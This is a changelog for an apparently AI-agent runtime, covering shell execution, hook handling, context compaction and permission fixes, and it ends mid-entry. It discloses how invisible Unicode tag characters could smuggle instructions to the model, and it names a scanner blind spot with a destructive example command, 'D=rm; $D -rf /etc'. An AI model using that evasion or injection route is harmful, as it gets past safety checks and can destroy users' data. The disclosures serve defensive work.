## [Unreleased]

_Targeting 0.4.22. Add entries under the relevant heading as work lands._

### Added

- **A Windows shell ladder, opt-in.** On Windows, `run_shell_command` has
  always gone straight to `%COMSPEC% /c` with a regex floor written for POSIX
  syntax. There is now a ladder that resolves an interpreter by identity —
  `pwsh` → `powershell.exe` → `cmd` — attests the image it is about to launch,
  hands the child a closed environment, and reads the command with that
  dialect's own grammar rather than someone else's. Turn it on per host with
  `"shell": {"ladder": true}` in the **user-level** `permissions.json`.

  **The default has not changed, and turning this on is a real change.** An
  interpreter that cannot be attested is refused rather than launched, and the
  trust predicate asks whether *the token the child will run as* could replace
  the image or any directory above it. **If agentao runs as an administrator
  on Windows, that is true of everything, so the trusted set is empty and every
  shell call is denied.** That is the rule working — an elevated agentao is its
  own attacker — and it is measured rather than predicted
  (`docs/reference/powershell-support-evidence.zh.md` §3.23). The same key
  turns it back off, which is why it is a configuration key and not a release.

- **`agentao.permissions_hardline.classify_refusal` / `tally`.** A refusal
  reason parses into a family, a dialect and a rule, and a sequence of them
  tallies into a distribution. Hosts that want to know *why* the floor is
  refusing things now have something better than substring matching: the
  reason space is six families, not one, and 23 of the shipped reasons are
  English sentences where colons carry no structure.

- **A Windows CI job** — Python 3.10 and 3.12, the full suite. This repository
  had never run its tests on Windows; the first run failed 155 of them. Six
  were product defects, listed under Fixed, and none of them is a "Windows
  bug": each is something POSIX absorbs quietly and Windows bills for.

### Changed

- **`default_spec()` takes the shell block and can answer `Exhausted`.** It
  used to take no configuration and always return a `ShellSpec`. Embedders
  calling it directly should handle both arms; every in-tree caller already
  did, because `ShellExecutor.shell_spec` has always been allowed to refuse.
  `LocalShellExecutor` gained a `shell_block=` argument, and
  `build_from_environment` supplies one when the host did not pass its own
  executor.

### Fixed

- **Every edit of a CRLF file doubled its carriage returns, on Windows.**
  `LocalFileSystem.write_text` did not pass `newline=""`, so Python translated
  each `\n` to `os.linesep` while the edit tool read the file as bytes. Fixed
  at all three writers in that path — the third is an `os.fdopen` on the
  staging file, which is the one an *existing* file goes through, and which a
  literal search for `open(` does not find.

- **The state directory moved on every run when there was no home directory.**
  The privacy check tested POSIX mode bits that `mkdir(mode=0o700)` does not
  set on Windows, so it could never be satisfied and the fallback minted a
  fresh `mkdtemp` each call. Windows now checks that the path is a real
  directory and not a reparse point.

- **Every memory read and write leaked a SQLite connection.** `with
  self._connect() as conn` reads like a resource scope and is not:
  `Connection.__exit__` commits or rolls back and leaves the connection open.
  On POSIX the file simply unlinks; on Windows the lock survives, so a host
  could not delete its own workspace. `MemoryManager.close()` and
  `Agentao.close()` now close the stores.

- **Two session saves inside one clock tick destroyed the first.** The filename
  is `datetime.now()` and nothing checked whether the name was taken. Windows'
  clock is far coarser than six digits of microseconds suggest.

- **An atomic write could fail because someone else had the file open.**
  `os.replace` is refused on Windows while any reader holds the target, and
  Python's `open` does not request `FILE_SHARE_DELETE` — an editor, an indexer
  or a virus scanner is enough. Short-lived handles are now waited out for
  about 200 ms. A continuously held one still raises, so on Windows the atomic
  write is "atomic or refused": the reader never tears, the writer pays.

- **A healthy ACP server was reported as an immediate exit.** The startup check
  waited a flat 50 ms to decide a spawned server had died, and Windows process
  creation routinely takes longer. It is 1 s there, 50 ms elsewhere.

- **`run_shell_command` promised the model `bash -c` and delivered `/bin/sh
  -c`. It is bash now.** The tool executes through
  `subprocess.Popen(command, shell=True)`, and Python hardcodes `/bin/sh` on
  POSIX — there was no `executable=` anywhere. On most Linux distributions
  that is dash, so bashisms the model reaches for by default died with a
  syntax error; macOS hid most of it because `/bin/sh` there is bash 3.2 in
  POSIX mode, which still rejects process substitution. `LocalShellExecutor`
  now passes `executable=` at **both** `Popen` sites (foreground and
  background — the background one is a separate call and would otherwise
  have run a different shell than the tool advertises).

  **bash is resolved, not assumed.** `capabilities/shell.py::
  resolve_shell_executable()` prefers `/bin/bash`, then `bash` on PATH, then
  returns `None` — Python's default — because Alpine and distroless images
  ship `/bin/sh` and no bash, where a hardcoded `executable` would turn every
  shell command into a `FileNotFoundError`. `/bin/bash` wins over the PATH
  lookup so the choice does not shift when a newer bash is installed under
  `/opt/homebrew`. The description is built from the resolver rather than a
  literal, so it degrades with it; the regression test asks the live
  interpreter what `$0` is and requires the description to name *that*.

  macOS `--sandbox` re-enters a second shell inside `sandbox-exec`, and that
  one moved too. Left on `/bin/sh` it would have meant the same command
  parsing on a plain run and failing under `--sandbox`.

  Windows is unchanged: `shell=True` there means `%COMSPEC% /c`, and
  `executable=` would replace cmd.exe rather than select a dialect.
  **Plugin hooks are also unchanged** and stay on `/bin/sh` deliberately —
  Claude Code 2.1.251 was measured running command hooks under `sh`
  (`docs/reference/hooks-probe-2.1.251.md` §A), so agentao's baseline there
  is conformant and moving it would be a divergence, not a fix.

  One consequence worth stating: the hardline scanner's known
  variable-indirection blind spot (`D=rm; $D -rf /etc`, already reachable
  under dash) gains one more bash-only member on Linux — `${D//X/}`. Same
  class, not a new one; `$'...'` decoding and `<(...)` were already covered,
  verified by probe.

## [0.4.21] — 2026-08-30

### Added

- **A Claude-shaped `hooks.json` now parses, and what it can do is an
  enumerated profile rather than a promise.** It used to parse to **zero
  rules**: the official file nests four levels — event → matcher group →
  `hooks[]` → handler — with a **string** matcher, and agentao read handlers
  straight out of the event array with a dict matcher. A user copying a working
  Claude Code hook setup got zero rules and one warning that pointed at the
  wrong thing: `Unknown hook type '' under 'PreToolUse'` — naming a `type` key
  the file had never written, because the outer entry it was reading is a
  matcher group, not a handler (measured at `10b5fb8`).

  Two contracts now live side by side and are resolved **per file by shape**,
  because a copied file carries no marker to gate on. `agentao-v1` (the flat
  shape) is **frozen** and behaves exactly as before; `claude-code@profile-1`
  is the new one. A file whose entries disagree about which shape they are is
  rejected whole; a single unrecognizable entry is not, so one typo cannot
  disable a working file.

  The profile is deliberately a *profile* and not "the Claude hook contract".
  agentao implements **8** of the reference's events — `PreToolUse`,
  `PostToolUse`, `PostToolUseFailure`, `UserPromptSubmit`, `Stop`,
  `SessionStart`, `SessionEnd`, `PreCompact` — and within them an
  **enumerated** field list. A field the profile does not implement is
  **ignored with a one-time diagnostic naming it**, never a schema error: a
  hook written for a newer Claude Code keeps working, and its author is told
  which key had no effect instead of guessing. The named-once bookkeeping is
  session-scoped and keyed by rule content, so a plugin reload lets a corrected
  hook speak up again.

  Concretely, under the profile: `permissionDecision` (with `defer` degraded to
  `deny`, the substituted value named in the reason), `updatedInput`,
  `additionalContext`, `systemMessage`, `continue` / `stopReason`, `decision` /
  `reason`, and exit code 2 — the last with **three** distinct outcomes rather
  than one, depending on the event: block the call, feed the model, or notify
  the user. Precedence when several arrive at once is a function, not a field
  order: exit 2 → `continue` → the event's own decision.

  The matcher is `re.fullmatch` with `*` and `""` special-cased as wildcards —
  **measured against a real `claude` 2.1.251**, not inferred. The plan carried
  an *unanchored* reading for its whole life and the binary refuted it: `ead`
  does not match `Read`. An unanchored implementation would have fired hooks on
  tools their author never named.

- **Hook output is bounded, in two tiers.** A hook could return unbounded
  stdout straight into the context window. Tier 1 caps the raw capture at
  **8 MiB** per stream per invocation (over it the process tree is killed and
  the hook fails — output cut mid-JSON has no decision to contribute); tier 2
  caps each delivered channel at **10,000 characters**, the reference's own
  number, counted in characters so the bound does not move with the model.
  Overflow spills to `.agentao/hook-outputs/`, files `0600`, **redacted before
  the bytes land**, pruned at 7 days / 200 files. A failed spill is reported,
  which the tool-output sink it copies does not do.

- **`${CLAUDE_PROJECT_DIR}`, `${CLAUDE_PLUGIN_ROOT}` and
  `${CLAUDE_PLUGIN_DATA}`** are substituted in a hook command and exported to
  the child, and handlers may use the exec form (`args`) instead of a shell
  string. The export goes through `build_child_env`, so the provider-credential
  scrub that has always applied to hook children still applies — writing it any
  other way silently removes it.

- **A hook can end a turn from inside a tool worker.** `PostToolUse` /
  `PostToolUseFailure` hooks run three frames below anything that could act on
  a decision, so a `continue: false` there was computed and dropped. The
  verdict now rides home on the execution result and is arbitrated in **plan
  order** — the model's own tool-call order, never completion order, which
  would make the surfaced reason vary run to run for the same batch. Every
  plan still yields a result and a `role:"tool"` message: ending a turn is not
  a rollback, and a missing tool message is rejected by strict APIs.

### Changed

- **`agentao run` gained an `error.type` / `error.reason` of `hook_stop`,
  exiting 1.** A turn a hook ended is a turn without a complete answer, so it
  joins the closed vocabulary rather than exiting 0. Branch on `reason`, not on
  `message`.

- **`SessionEnd` hooks now dispatch *before* `agentao run` emits its result**,
  and their user-facing notices ride on `RunResult.warnings`. The old order
  wrote the run's entire output first and detached observers well above, so a
  `SessionEnd` hook's exit-2 stderr reached a headless user through **no path
  at all**. Interactive sessions gained the same route: the CLI now consumes a
  return value it used to discard inside a bare `except: pass`.

- **`PLUGIN_HOOK_FIRED` carries `user_notices`.** Hosts that render hook output
  read it there; the two first-party surfaces route directly and do not depend
  on it.

- **Supersedes 0.4.7's description of multi-hook `PreToolUse` merging** for
  `claude-code@profile-1` rules. "First `deny` wins, then first `ask`" becomes
  a lattice — `deny > ask > allow` — whose reason tie-break ranks **only inside
  the winning class** and by declaration order, so an `ask`'s reason is never
  surfaced for a `deny`. Contexts, rewrites and stops are orthogonal and
  concatenate regardless of who won. `agentao-v1` rules are unaffected. In a
  mixed file the two contracts are partitioned, run, and merged once; a v1
  short-circuit ends only the v1 group, because the profile's "every handler
  runs" rule exists for handlers with side effects.

- **A `Stop` hook's reentry cap is contract-resolved** — 8 under the profile
  (the reference's number), 3 under `agentao-v1` (agentao's, unchanged), so a
  pure v1 setup keeps its limit and a mixed session is not silently loosened.

- **Under the profile, `PreToolUse` fires on a call the permission engine has
  already denied.** Observation and authority are separate: an audit or
  notifier hook was blind to exactly the calls it exists to record. The verdict
  stays `DENY`. `agentao-v1` keeps the skip.

### Fixed

- **A `PreToolUse` hook's `continue: false` never ended the turn.**
  `ToolRunner.execute()` reset the stop slot at the *bottom*, wiping the value
  phase 1.5 had written. The test that covered it called the phase helper
  directly, so it observed the write and never the wipe. The same misplacement
  leaked a stale stop across the two early returns, and a `PreToolUse` stop now
  outranks a later `PostToolUse*` one.

- **An unusable `updatedInput` re-decision ran the original command.** A
  `PreToolUse` hook that rewrites a call's input has already said the original
  must not run; when the permission re-decision could not be computed, the
  rewrite was dropped and the original executed under the verdict computed for
  it. The call is now **denied** — neither the rewrite nor the original. The
  arguments are also no longer swapped in before the re-decide, which could
  leave a plan holding rewritten arguments under a verdict computed on the
  originals.

- **Hook-authored context reached the model without the Unicode-tag strip.**
  It was appended to the tool message *after* `strip_unicode_tags`, leaving the
  one model-bound string on that path that skipped the boundary — and hook text
  is routinely a relay of something the hook read (a page, an MCP result, a
  file), which is the carrier that defense exists for.

- **One malformed hook could drop every other hook's verdict for a call.** A
  non-string `permissionDecision` (a list, an object) hit a `in <dict>`
  membership test, which hashes its operand; the `TypeError` propagated out of
  dispatch and was swallowed by the caller, and the tool ran.

- **Every `PostToolUse` / `PostToolUseFailure` user notice was dropped.** The
  dispatch helper returned only the stop and the model-bound contexts, so
  `systemMessage` and the one-time field diagnostics were computed inside a
  worker with no user surface and discarded.

- **The one-time field diagnostic was once per *process*, not per session** —
  the session id never reached the registry, so every session shared one
  bucket — and `/clear` did not drop the session's entries.

- **A field was diagnosed by name alone rather than per event**, so
  `hookSpecificOutput.reloadSkills` on `PostToolUse` was announced with
  `SessionStart`'s reason, as though agentao had considered and declined it
  there.

- **An empty matcher (`""`) matched nothing**, where the reference treats it as
  a wildcard — so a copied config that spells the wildcard that way parsed with
  no warning and never fired. Confirmed by probe, with both controls present.

- **Exit code 2 on `Stop` left the continuation contract unset**, handing the
  profile's own idiom the `agentao-v1` reentry cap of 3 instead of 8.

- **A second stopping rule with no `stopReason` erased the first rule's
  reason**, so the user was told a turn had ended and not why.

- **The `defer` → `deny` substitution notice lost to the hook's own reason**,
  and a `defer` almost always ships one — so the message naming the swapped
  verdict was the one that never survived.

- **The `PreToolUse` payload omitted `cwd`**, reporting the process's directory
  where the `Post*` events beside it sent the session's.

- **Two pieces of host-visible text named one event where two apply.** The
  aggregated notice event was labelled `PostToolUse` although a failing call in
  the same batch routes through `PostToolUseFailure` (now `PostToolUse*`), and
  `agentao run`'s `hook_stop` message said "a PostToolUse hook" although a
  `PreToolUse` stop reaches the same path.

## [0.4.20] — 2026-08-24

### Added

- **The context window is validated against the provider, and self-heals.**
  `max_tokens` is a documented host-owned knob on four surfaces, and this does
  not take that ownership away: it stays exactly what the host configured and
  reads back unchanged. What is new is a second, lower ceiling learned from
  the provider's own overflow errors — `effective_max_tokens = min(configured,
  observed)` — which every internal budget is now denominated in
  (`needs_compression`, the microcompaction band, the summary-input budget,
  and `usage_percent`, which otherwise reported 70% while the API was already
  rejecting).

  **The parse is provider-asserted, not a number scrape, and when it is not
  certain it adopts nothing.** Of the 21 overflow patterns roughly half carry
  no number, and most of the ones that do carry **two** — Anthropic's
  `213462 tokens > 200000 maximum` has the request size *and* the limit.
  Adopting the wrong one permanently shrinks the window until the next model
  switch: a silent degradation with no warning, which is the failure class
  this exists to remove. So every pattern is anchored to the phrase that
  *names* the limit, a value outside sanity bounds is refused, and **two
  patterns disagreeing adopts nothing**. Ollama's `exceeded max context length
  by 1200 tokens` is the case that proves it: 1200 is a delta, and nothing
  matches it.

  The observed limit is discarded on a model or endpoint switch — joining the
  existing clear-on-switch family (thinking artifacts, tiktoken encoding,
  token anchor, capability latches) — with a warning that the window is
  unverified for the new model. A pure credential rotation leaves it alone.
  `/context` shows configured, effective, and the provenance string the limit
  was read from. `get_usage_stats()` keeps `max_tokens` meaning *configured*,
  so old readers are unaffected, and gains `effective_max_tokens`,
  `observed_limit` and `observed_limit_provenance`. ACP's
  `session/set_model` echo still returns the configured value — it is a
  setter, and its echo must equal what was just written.

  **What this cannot do, stated plainly:** an overflow error is its only
  input, so **the first fall into the recovery ladder is its input, not
  something it can prevent**. It reduces how often you fall in again.

- **`PreCompact` can now say no.** It was notify-only: `dispatch_pre_compact`
  fired the hook through `_dispatch_lifecycle` and threw the output away, so a
  host watching its own context about to be rewritten had no way to stop it.
  Two layers, consulted in that order:

  1. **Command hooks** — a hook that prints
     `{"hookSpecificOutput": {"compactionDecision": "cancel", "compactionDecisionReason": "..."}}`
     cancels the compaction. First cancel wins and stops the remaining forks.
     The key is deliberately **not** `permissionDecision`: `compactionDecision`
     has never existed in agentao, so no existing script can produce it by
     accident — which is why this needs no opt-in gate. Everything that is not
     an explicit `cancel` means allow, including an unknown value (with a
     warning): a typo must not be able to pause compaction until the context
     blows up. Exit code 2 stays unhonoured, matching `PreToolUse`.
  2. **`compaction_controller=`**, a new keyword-only constructor argument for
     trusted embedded hosts. It gets a `CompactionDecisionContext` — counts,
     budgets and file paths, **never message text** — and returns `allow`,
     `cancel`, or `provide_summary(text)`. Synchronous; v1 does not accept a
     coroutine. **A controller that raises is caught, warned about and treated
     as `allow`**, as is any unknown return: two of the five entry points *are*
     the API-overflow recovery ladder, so an exception escaping a controller
     would turn "context too long" into "the turn crashes".

  A host summary is validated before it is committed (non-empty, a `str`,
  within half the summary-input budget, and free of `SUMMARY_END_MARKER`,
  which would break the *next* compaction's carry-stripping). An invalid one
  is **not** a terminal state: it is rejected, logged, and the built-in
  summarizer runs once as if the host had said `allow`. What the breaker
  counts is always the built-in summarizer's failure, so a bad controller
  costs one extra summarization and can never disable auto-compaction.

  **Arbitrary message-list replacement is out of scope.** agentao's history is
  a flat list where `tool_calls[*].id` must round-trip byte-for-byte; a host
  returning an orphaned tool result would produce a request the provider
  refuses, at a point where history has already been destroyed.

- **Cancellation semantics, which is what made this shippable.** The 2026-05
  plan deferred the gate because "a host denied and it is still too long"
  looked like unrecoverable runaway. It is not, because a cancel is honoured
  *and reported*:

  - A cancelled **threshold** compaction is not re-dispatched for the rest of
    the turn — a coordinator-owned latch keyed `(kind, reason)`, cleared at the
    start of each turn. Without it, honouring a cancel would mean forking the
    hook again on the very next iteration, which is the cost the stand-down
    gates exist to remove. A latch hit is silent: no hook, no controller, no
    event.
  - If the API then really overflows, the host is asked **again** with
    `reason=api_overflow`. That is a different question and gets its own
    answer — the latch key carries the reason.
  - A cancelled **overflow** returns the provider's context-length error to
    the caller. It does **not** quietly fall through to `messages[-2:]`. Rung 2
    is a separate dispatch site and behaves the same way.
  - `manual_cli` never enters the latch: `/compact` is user-driven, does not
    loop, and runs outside a turn, so a turn-reset latch would mean "cancel
    once and every immediate retry stays suppressed until you first run an
    ordinary turn".
  - A cancelled **microcompaction** simply skips that pass and returns no
    error — it was never the step you cannot proceed without.

  `PLUGIN_HOOK_FIRED`'s `outcome` for `PreCompact` can now be `cancel` as well
  as `allow`.

- **`PreCompact` hooks can finally match on where a compaction came from.**
  `build_pre_compact` takes a required `trigger` argument and each of the five
  compaction entry points states its own provenance, so manual `/compact`
  reports `manual` and the four automatic sites report `auto`. `trigger` keeps
  Claude Code's `manual | auto` vocabulary — the finer provenance was already
  in `compaction_type` and `reason`, which are now typed (`CompactionKind`,
  `CompactionReason`) in a new standard-library-only `agentao/compaction/`
  module. `custom_instructions` also becomes a parameter instead of a hardcoded
  `""`, though nothing passes it yet.

  **This changes which rules fire.** Until now the payload hardcoded
  `"trigger": "auto"` everywhere, so `{"trigger": "manual"}` was a matcher value
  with **no reachable producer** — a rule written against it could never fire at
  any entry point, in any configuration — while `{"trigger": "auto"}` wrongly
  matched manual `/compact` too. After this change `{"trigger": "manual"}` fires
  on `/compact` and only on `/compact`, and `{"trigger": "auto"}` stops matching
  it. A rule written `{"trigger": "manual|auto"}` (Claude Code's own alternation
  form) matches all five entry points before and after, and is the shape to
  reach for if you want everything.

  Also fixes the disagreement where manual `/compact`'s hook payload said
  `auto` while its own `PLUGIN_HOOK_FIRED` replay event said `manual` for the
  same compaction. `docs/releases/v0.4.4.md` gains an erratum, since its
  `trigger` row's "no `manual` site exists" was true at 0.4.4 and false since.

- **An opt-in token budget for the kept-verbatim tail**
  (`ContextManager.keep_recent_token_ratio`, default `None` = today's
  behaviour exactly). `KEEP_RECENT_MESSAGES = 20` is a *message count*, and 20
  messages can be 500 tokens or 200 K. This is aimed at "still heavy **after**
  compaction", not at the summary input: the kept tail never reaches the
  summarizer — it is spliced verbatim into the result — so a heavy tail
  re-crosses the threshold immediately and the next iteration compacts again.

  The count start and the token start are combined with **`max`**, not `min`:
  a later start means fewer kept, and the token budget is the tightening
  constraint, so taking the earlier one would simply violate it on exactly the
  heavy tail this exists to fix. **Accepted consequence: fewer than 4 messages
  can be kept** — there was never a real message-count floor anyway
  (`keep_count` only sets a *search start*; `_find_split_index` scans forward
  from it), and the one structural floor is 1. Logged when it drops below 4.

  Off by default on purpose: the right value has to come from measurement
  against the 0.80 baseline, and nothing here has measured it.

- **Two P3 partial mitigations, labelled as partial.**

  *The originating request.* A cut landing mid-turn gave no guarantee that the
  request which started the work survives to the summarizer — it is in the
  window, but nothing reserved budget for it, so a long tail of tool traffic
  could evict the one sentence saying what the work was for. It is now
  restated in an `<originating-request>` section **when, and only when, it did
  not survive the ordinary spend** — so the common case is unchanged and the
  transcript's survivors stay a contiguous suffix (a hole would hand the
  summarizer a history that omits a step without saying where). **This does
  not close the P3**: reserving *input* budget does not make the model write
  the request into its *output*.

  *Images.* `_count_message_tokens` sums only `type == "text"` blocks, so
  images are estimated at **zero**. That is unchanged by default and now
  stated; `ContextManager.image_token_estimator` lets a host inject a charge.
  Injectable rather than a constant because the right number is per-provider
  and per-resolution, and a wrong constant baked in would be a silent
  mis-estimate on every image-bearing history.

- **The compaction circuit breaker is recoverable.** It was a one-way latch:
  three consecutive failures set a counter, the counter's only reset was a
  successful compaction, and the short-circuit sat *above* every branch — so
  the one action a user could take to recover, `/compact`, was itself blocked.
  `/clear` did not help either; it clears messages, skills, todos, the token
  anchor and the token counters, but never the failure count. A session that
  tripped it could not auto-compact again, at all, ever.

  Now three failures pause the **threshold** tier only. Manual `/compact` and
  an API overflow run as **half-open probes** — neither is what the breaker
  describes, which is "stop re-entering every iteration", and blocking an
  overflow leaves the recovery ladder with nothing to fall back on but
  `messages[-2:]`. A successful probe closes the breaker immediately; a
  failed one leaves it exactly as it was.

  **`/clear` now closes it too** (via `ContextManager.reset_compaction_circuit()`,
  called from `clear_history()`): the count measures *this* conversation's
  failures, so replacing the conversation invalidates the evidence behind it.

  **Behaviour change: a failed summarization on the manual path no longer
  counts.** The increment was unconditional, so three manual retries could
  disable automatic compaction for the rest of the session. It now carries the
  same `is_auto` exemption the structural-failure path already had, for the
  same stated reason — a user-driven compaction does not loop, so there is no
  runaway to arrest.

- **`/context` reports the breaker as a state, not a tally.** It showed
  `Compact failures: 3/3 (circuit open — auto-compact disabled)`, which was
  true and useless. It now names the state (`open` / `closed`), the class of
  the last failure (`no_safe_split` / `summary_empty` — they need different
  answers), and how to get out of it. `get_usage_stats()` gains
  `circuit_breaker_open` and `last_compaction_failure`; the existing
  `circuit_breaker_failures` key is unchanged.

- **`Agentao.compact(*, reason="manual_cli") -> CompactionOutcome`** — the
  public compaction entry. There was none: all three call sites reached
  straight into `context_manager`, which is how five entry points came to
  disagree about what a compaction had done. `reason` selects which policy
  applies — `manual_cli` and `api_overflow` probe through an open breaker,
  `compression_threshold` is paused by it — and the returned outcome says
  `success | cancelled | failed | skipped` with a `detail`. History is
  byte-identical on every status but `success`.

- **All five compaction entry points now go through one `CompactionCoordinator`,
  and every attempt returns one `CompactionOutcome`.** Microcompaction, the
  threshold tier, both rungs of the API-overflow ladder and manual `/compact`
  used to orchestrate compaction independently, and they disagreed about the
  two things that matter: whether a failure counts, and whether "compacted"
  means history actually changed.

  **The observable fix: `CONTEXT_COMPRESSED` is emitted only when the
  compaction succeeded.** The API-overflow path emitted it unconditionally, so
  with the circuit breaker open it reported a compaction that returned the
  message list untouched — `pre_msgs == post_msgs`, no summary, nothing
  written. The threshold tier got this treatment in 0.4.19; the overflow path
  was missed. **`CONTEXT_COMPRESSED`'s payload does not change by a single
  key**, and both its token fields keep their system-*inclusive* unit.

  A new `COMPACTION_SETTLED` event (replay schema **1.3**) is the terminal
  event for one attempt whatever the outcome — `success | cancelled | failed`,
  with `trigger` / `kind` / `reason` / `detail`. `skipped` emits **nothing**,
  deliberately: three of its four cases re-trigger on every loop iteration, so
  one event each would be an event storm rather than a signal. Its
  `pre_tokens_history` / `post_tokens_history` are named apart from the old
  event's pair because they **exclude** the system prompt — two units, two
  names, so they cannot be wired to each other by accident. Both stay `null`
  on the overflow rungs and on microcompaction, since filling them in means
  full-history estimates exactly where they cost most.

  **Second deliberate behaviour change: a failed summarization no longer
  writes to the memory store.** `crystallize_user_messages` ran *before*
  summarization, so a summarization that then returned nothing had already
  crystallized. `compress_messages` splits into `prepare_compaction` /
  `commit_compaction`, and both SQLite writes moved to commit — which does not
  run unless a summary exists.

  Also: the API-overflow rung finally passes its real `reason`
  (`api_overflow`) instead of riding `compress_messages(is_auto=True)`'s
  default and reporting itself as a threshold compaction, contradicting the
  hook payload it had just emitted; `/compact` stops guessing success by
  sniffing `messages[0]` for a `[Compact Boundary]` marker and reports the
  actual reason it made no change; and the duplicated `PreCompact` dispatch in
  the CLI is gone — one implementation serves all five entries.

  `ContextManager.compress_messages()` keeps its signature, its return type
  and its breaker gate, and is now a thin wrapper over the split. It cannot
  say *why* nothing changed, so new code should go through the coordinator;
  a direct call bypasses the host control plane and the breaker's probe
  policy.

- **Full LLM compaction now triggers at 80% of `max_context_tokens`, not 65%**
  (`ContextManager.COMPRESSION_THRESHOLD` 0.65 → 0.80). agentao was the most
  conservative of its peers by 25–27 points (pi-mono compacts at
  `contextWindow − reserveTokens` ≈ 92%; codex at
  `min(config, context_window × 9/10)`), and the accuracy argument for
  compacting early does not hold — the threshold estimate is anchored to the
  API's own `prompt_tokens` whenever a fresh anchor exists, so it is not a
  guess that needs a wide margin. Two consequences to know about. **The cheap
  tier's band widens**: `MICROCOMPACT_THRESHOLD` is unchanged at 0.55, so
  microcompaction now covers `(55%, 80%]` instead of `(55%, 65%]` — more
  no-LLM tool-result clearing passes run before the expensive summarization
  fires, which is the point, but a session can now sit well above the old
  threshold with tool results already fully clipped and no summarization
  scheduled. **Headroom narrows from 35% to 20% of the configured window**:
  that margin is what absorbs a mis-set `max_context_tokens` (the CLI applies
  one `200_000` default to every model and `/model` does no reconciliation),
  and it is what the 2-rung API-overflow ladder falls back on. Hosts running a
  window larger than their model's real one will reach the ladder sooner. The
  ratios remain **not configurable**.

- **BREAKING — a broken `permissions.json` now aborts session creation instead
  of silently loading no rules.** Unreadable, not valid UTF-8, malformed JSON, a
  top level that is not an object, an unknown top-level key, or a rule that
  fails the new validation all raise `PermissionConfigError` naming the path.
  The document key set is closed for the same reason the rule key set is:
  `data.get("rules", [])` swallowed `{"rule": [...]}` whole — the file parsed,
  every rule was dropped, and `active_permissions()` still reported the file
  under `loaded_sources`. Every other config file keeps
  the old warn-and-degrade contract; the policy file is the exception because
  dropping its rules is not a neutral degradation — a user `deny` on a shell or
  web tool degrades to *ask*, and a `deny` on an `mcp_*` tool degrades to
  nothing at all (the engine returns no decision, the runtime falls through to
  the tool's own `requires_confirmation`, and a `trust: true` server's tool then
  runs with no prompt). `agentao doctor` reports the same failures **without**
  aborting — the moment you most need diagnostics is when your config is broken.
  If you have been running with a malformed policy file without noticing, fix it
  or move it aside. Documented contract updated at
  `docs/reference/configuration.md` §4, and
  `test_invalid_json_user_config_graceful_fallback` is inverted into
  `test_invalid_json_user_config_fails_closed`.

- **BREAKING — permission rules are validated, and an unknown `action` is now
  rejected rather than treated as `ask`.** The rule key set is closed (`tool`,
  `args`, `domain`, `action`; under `domain`: `url_arg`, `allowlist`,
  `blocklist`) and every field is type-checked, and `tool` / `action` are
  required rather than defaulted. Absence was the hole a closed key set alone
  left open: `rule.get("tool", "*")` makes a `tool`-less `{"action": "allow"}`
  an allow-**everything** rule with no misspelled key for the unknown-field
  check to catch. Write `{"tool": "*"}` for a deliberate wildcard.
  `action` stays case-insensitive.
  The `ask` fallback for unknown values is what let `{"action": "alow"}` sit in a
  config doing nothing while `/permissions` printed it back as `[? ALOW]`. One
  validator, `permissions.py::validate_permission_rules`, shared by all three
  doors into the engine: the file loader, `PermissionEngine(rules=...)`, and
  `add_run_rules()` (the run spec's `permissions:` block). Rejection is uniform —
  an invalid `deny` is not kept as "fail-closed and therefore safe", because the
  `{"tools": ...}` typo turns a single-tool deny into a **deny-all**.

- **Read-only mode's deny message now tells the model not to retry.** It was the
  one deny branch without that close, and it is evaluated first, so it also
  shadowed a PreToolUse hook's. The three copies of the sentence in
  `tool_executor.py` are now one constant.

### Changed

- **The carried summary is out of the summary-input eviction pool.** A prior
  `[Conversation Summary]` was fed back as a block *inside* the newest-first
  allocator, where it is by construction the **oldest** block in the window —
  so plain backwards spending drops it first, and every compaction after the
  first would amputate the accumulated history. Three local patches existed to
  stop that (`carry_index`, `_clip_carry_summary`, and the special case in
  `_join_within_budget`); all three are gone. It is now rendered as its own
  `<previous-summary>` section, so the guarantee is structural rather than
  patched — there is no eviction to be exempt from — and the summarization
  prompt asks for an **UPDATE** that supersedes it rather than a fresh
  summary.

  **The replacement ceiling is mandatory, not optional**, and is restated
  rather than inherited: carry ≤ half the summary-input budget, and
  carry + live ≤ the whole budget. Both texts still go into one provider
  request, so "its own budget" only changes the bookkeeping — the
  provider-level competition is unchanged.

### Fixed

- **Invisible Unicode tag characters were passed straight to the model.** The
  U+E0000–U+E007F block mirrors ASCII into codepoints that render as
  **nothing** and round-trip losslessly through every tokenizer agentao uses,
  so a web page, an MCP result or a file could carry instructions invisible in
  the terminal, invisible in a diff, and fully legible to the model. Nothing
  stripped them. `security/unicode_tags.py::strip_unicode_tags` now runs at
  three boundaries: the model-bound copy of every tool result (deliberately
  *after* the replay emit, so the audit record keeps the original bytes),
  model output re-entering the runtime, and the terminal display.

  **It is structural, not a range filter.** The block's one legitimate use is
  RGI emoji tag sequences, so filtering the whole range destroys every
  subdivision flag — 🏴󠁧󠁢󠁳󠁣󠁴󠁿/🏴󠁧󠁢󠁷󠁬󠁳󠁿/🏴󠁧󠁢󠁥󠁮󠁧󠁿 all collapse to 🏴. Here a run survives only as
  `U+1F3F4` + at most five lowercase-alnum tag characters + `U+E007F`, and at
  most `_MAX_TAG_SEQUENCES` (8) such runs per string — the per-sequence cap
  alone bounds nothing, since chaining N valid sequences yields N×5 hidden
  characters. `tool_calls[*].id` and `function.arguments` are exempt and both
  sanitize paths agree on that: the id must round-trip byte-for-byte or
  history desynchronises from the answering `role: "tool"` message.

  This is a transform applied at named boundaries, **not an ambient
  guarantee** — skill and MCP descriptions inlined into the system prompt do
  not pass through it.

- **Stale thinking artifacts went back on the wire after a model switch.**
  `reasoning_content` and `thought_signature` are minted by one model and only
  meaningful to it, agentao serialises both into history, and the OpenAI SDK
  does not strip unknown message keys — so after `/model` or `/provider` they
  were sent to a model that never issued them.
  `runtime/model.py::purge_thinking_artifacts` drops both at **both levels** of
  a tool call (the entry and its `function`, because the real Gemini shape puts
  it on the entry). Wired into `set_model`, into `set_provider` when the model
  *or* the endpoint changes (a bare credential rotation leaves history alone),
  and into both wholesale-history-restore sites — `/resume`, which deliberately
  does not restore the persisted model and is a model switch in all but name,
  and ACP session load. It also invalidates the cached token anchor, since
  history just shrank.

- **The Stop hook, the CLI, `agentao run` stdout and the ACP final text all
  received unsanitized assistant text.** `_resolve_stop_hook` read the turn's
  answer from the caller's local variable while every call site sanitizes the
  dict in place. Found while wiring the tag stripping above.

- **A turn that exhausted its tool-call budget reported itself as an answer.**
  It returned `TurnOutcome(status="ok", incomplete_reason=None)`, so
  `is_answer` was True and the harness's own "Maximum tool call iterations
  reached." string was indistinguishable from a model answer. The only signal
  was `NonInteractiveTransport.max_iterations_hit`, a sticky flag on one
